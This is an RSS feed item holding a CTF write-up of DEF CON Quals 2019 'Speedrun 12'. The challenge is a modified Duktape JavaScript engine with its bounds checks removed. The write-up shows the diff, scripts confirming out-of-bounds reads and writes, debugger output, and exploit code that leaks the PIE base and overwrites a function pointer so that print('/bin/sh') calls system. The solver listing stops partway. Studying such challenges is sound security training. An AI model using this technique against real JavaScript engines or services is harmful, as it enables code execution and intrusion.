
   <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
       <title>pwn on Catousify</title>
       <link>http://kiror0.github.io/ctf/categories/pwn/</link>
       <description>Recent content in pwn on Catousify</description>
       <generator>Hugo -- gohugo.io</generator>
       <language>en-us</language>
       <copyright>Copyright &amp;copy; 2019 - kiror0</copyright>
       <lastBuildDate>Tue, 14 May 2019 00:53:00 +0000</lastBuildDate>
       
           <atom:link href="http://kiror0.github.io/ctf/categories/pwn/index.xml" rel="self" type="application/rss+xml" />
       
       
       <item>
         <title>DEF CON Quals 2019 - Speedrun 12</title>
         <link>http://kiror0.github.io/ctf/posts/def-con-quals-2019-speedrun-12/</link>
         <pubDate>Tue, 14 May 2019 00:53:00 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/def-con-quals-2019-speedrun-12/</guid>
         <description>&lt;h2 id=&#34;desc&#34;&gt;desc&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/adamdoupe/9fb1fed69421e789a0a623af912e456a&#34;&gt;https://gist.github.com/adamdoupe/9fb1fed69421e789a0a623af912e456a&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Downloads :
&lt;a href=&#34;http://kiror0.github.io/ctf/ctf/assets/defcon/speedrun-012/speedrun-012&#34;&gt;speedrun-012&lt;/a&gt;
&lt;a href=&#34;http://kiror0.github.io/ctf/ctf/assets/defcon/speedrun-012/solve.js&#34;&gt;solve.js&lt;/a&gt;
&lt;a href=&#34;http://kiror0.github.io/ctf/ctf/assets/defcon/speedrun-012/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;intro&#34;&gt;intro&lt;/h2&gt;
&lt;p&gt;This article is written by a first timer to experience &amp;ldquo;exploiting&amp;rdquo; &lt;del&gt;real&lt;/del&gt; JS engine. :p&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Duktape is an embeddable Javascript engine, with a focus on portability and compact footprint.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In short we have a mini JS engine pwn. The &lt;code&gt;main&lt;/code&gt; function is realtively easy to read,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;  setvbuf(stdout, NULL, _IONBF, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  ctx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; duk_create_heap(NULL, NULL, NULL, NULL, fatal_error);
  duk_push_c_function(ctx, native_print, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  duk_put_global_string(ctx, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;getenv(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;DEBUG&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) )
    alarm(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( getenv(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;USE_SYSTEM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) )
  {
    duk_push_c_function(ctx, native_system, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    duk_put_global_string(ctx, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  }
  memset(input, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;);
  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, input, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FF&lt;/span&gt;);
  duk_eval_raw(ctx, input, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE08&lt;/span&gt;);
  duk_pop(ctx);
  duk_destroy_heap(ctx);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First, the program create the &lt;code&gt;ctx&lt;/code&gt; for duktape, then register &lt;code&gt;print&lt;/code&gt; function to ctx &amp;ldquo;stack&amp;rdquo;. &lt;code&gt;print&lt;/code&gt; it self doesn&#39;t have anything fancy, only calling &lt;code&gt;puts&lt;/code&gt; to the concatenated argument passed to it. We also have &lt;code&gt;native_system&lt;/code&gt; might be useful for later stage, so take note of it. Near the end, the program tries to read JS from user the eval it.&lt;/p&gt;
&lt;h2 id=&#34;finding-bugs&#34;&gt;finding bugs&lt;/h2&gt;
&lt;p&gt;From the gists, we could see the author did some change to the builtins, the most interesting ones are these,&lt;/p&gt;
&lt;p&gt;from line 765-776&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;@@ -2347,10 +2344,7 @@
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 	switch (magic_ftype) {
 	case DUK__FLD_8BIT: {
 		duk_uint8_t tmp;
&lt;span style=&#34;color:#f92672&#34;&gt;-		if (offset + 1U &amp;gt; check_length) {
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-			goto fail_bounds;
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-		}
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-		tmp = buf[offset];
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+		tmp = buf[offset_signed];
&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt; 		if (magic_signed) {
 			duk_push_int(thr, (duk_int_t) ((duk_int8_t) tmp));
} else {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;from line 866-883&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;@@ -2653,16 +2670,13 @@
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 	}
 	case DUK__FLD_32BIT: {
 		duk_uint32_t tmp;
&lt;span style=&#34;color:#f92672&#34;&gt;-		if (offset + 4U &amp;gt; check_length) {
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-			goto fail_bounds;
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-		}
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt; 		tmp = (duk_uint32_t) duk_to_uint32(thr, 0);
 		if (endswap) {
 			tmp = DUK_BSWAP32(tmp);
 		}
 		du.ui[0] = tmp;
 		/* sign doesn&amp;#39;t matter when writing */
&lt;span style=&#34;color:#f92672&#34;&gt;-		duk_memcpy((void *) (buf + offset), (const void *) du.uc, 4);
&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+		duk_memcpy((void *) (buf + offset_signed), (const void *) du.uc, 4);
&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt; 		break;
 	}
case DUK__FLD_FLOAT: {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first one is from &lt;code&gt;duk_bi_buffer.c&lt;/code&gt; -&amp;gt; &lt;code&gt;duk_bi_buffer_readfield()&lt;/code&gt;, or in JS &lt;code&gt;Buffer.read[bitsize]()&lt;/code&gt;. This is on &lt;code&gt;DUK__FLD_8BIT&lt;/code&gt;, so we could also assume this is in &lt;code&gt;readUInt8()&lt;/code&gt;. The removed lines are checking against &lt;code&gt;offset + BLAH&lt;/code&gt;, this could be a bound check for read. Well, you wouldn&#39;t want the buffer read past the size or certain check_length. Testing it to confirm our assumption,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat test.js
var a = new OOOBufferOOO(64);
print(a.readUInt8(66));
$ ./speedrun-012 &amp;lt; test.js
5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Well, that&#39;s clearly an OOB read, usually you would get an &lt;code&gt;undefined&lt;/code&gt; as result when trying to read past the size.&lt;/p&gt;
&lt;p&gt;The second one is from &lt;code&gt;duk_bi_buffer.c&lt;/code&gt; -&amp;gt; &lt;code&gt;duk_bi_buffer_writefield()&lt;/code&gt;. Well, you could guess from the first one, this is an OOB write in &lt;code&gt;writeUInt32LE/BE()&lt;/code&gt;. To check it again,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat test.js
var a = new OOOBufferOOO(64);
print(a.readUInt8(66));
a.writeUInt32LE(99, 66);
print(a.readUInt8(66));
$ ./speedrun-012 &amp;lt; test.js
5
99
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;finding-attack-vector&#34;&gt;finding attack vector&lt;/h2&gt;
&lt;p&gt;Now, we already have R/W primitive, but how to get the shell? The binary has complete protection (NX bit, FULL RELRO, etc.), but&amp;hellip; do you still remember that we have &lt;code&gt;native_system&lt;/code&gt; in the binary, and the fact that &lt;code&gt;print&lt;/code&gt; register &lt;code&gt;native_print&lt;/code&gt; into the ctx stack? Well, see where this will be going? Try to hack this yourself!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;damn. Just give me the PoC now. sheesh.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ok :|&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;attaccc&#34;&gt;attaccc&lt;/h2&gt;
&lt;p&gt;Well, the idea is to overwrite the function pointer of &lt;code&gt;native_print&lt;/code&gt; that get push-ed into ctx stack, which actually lies in heap section. The first step is to find offset difference between &lt;code&gt;OOOBufferOOO&lt;/code&gt; and &lt;code&gt;native_print&lt;/code&gt;. A simple nice trick to know where out buffer will lands on memory is to create a unique id. For example,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OOOBufferOOO&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I&#39;ve set a to has 0xdeadbeef, then use search in pwndbg,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; search -t dword 0xdeadbeef
[heap]          0x5555557cbe80 0xdeadbeef
pwndbg&amp;gt; search -t qword $rebase(native_print)
[heap]          0x5555557d5af8 0x55555555e270
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To get the offset difference, you&#39;ll just need substract it, ofc :p. &lt;code&gt;0x5555557cbe80-0x5555557d5af8&lt;/code&gt; -&amp;gt; &lt;code&gt;0x9c78&lt;/code&gt;. Since duktape can&#39;t handle 64bit values, we could only just use 32 bit vars, but it&#39;s enough for this case. Try leaking the lower 4 byte of PIE offset,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c7b&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c7a&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c79&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c78&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;));

&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;native_print&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)); &lt;span style=&#34;color:#75715e&#34;&gt;// PIE
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After that we just need to overwrite the function pointer to &lt;code&gt;native_system&lt;/code&gt;,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeUInt32LE&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;native_system&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c78&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, calling &lt;code&gt;print()&lt;/code&gt; will be the same as &lt;code&gt;system()&lt;/code&gt;,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// system(&amp;#39;/bin/sh&amp;#39;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;full-solver-and-flagg&#34;&gt;full solver and FLAGG&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// note
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// a.readUInt8(pos);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// a.writeUInt32LE(val, pos);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// kindofzfillbutsuperlame
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// function pad(b) {
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 	while (b.length &amp;lt; 2) b = &amp;#39;0&amp;#39; + b;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 	return b;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// mini &amp;#34;hexdump&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// for (var i = -0x5F18; i &amp;lt; -0x5F00; i += 16) {
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 	r = &amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 	for (var j = i; j &amp;lt; i + 16; ++j)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 		r += pad(a.readUInt8(j).toString(16)) + &amp;#39; &amp;#39;;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 	print(r);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OOOBufferOOO&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;native_system&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA220&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;native_print&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA270&lt;/span&gt;;

&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;;

&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c7b&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c7a&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c79&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c78&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;));

&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;native_print&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;));

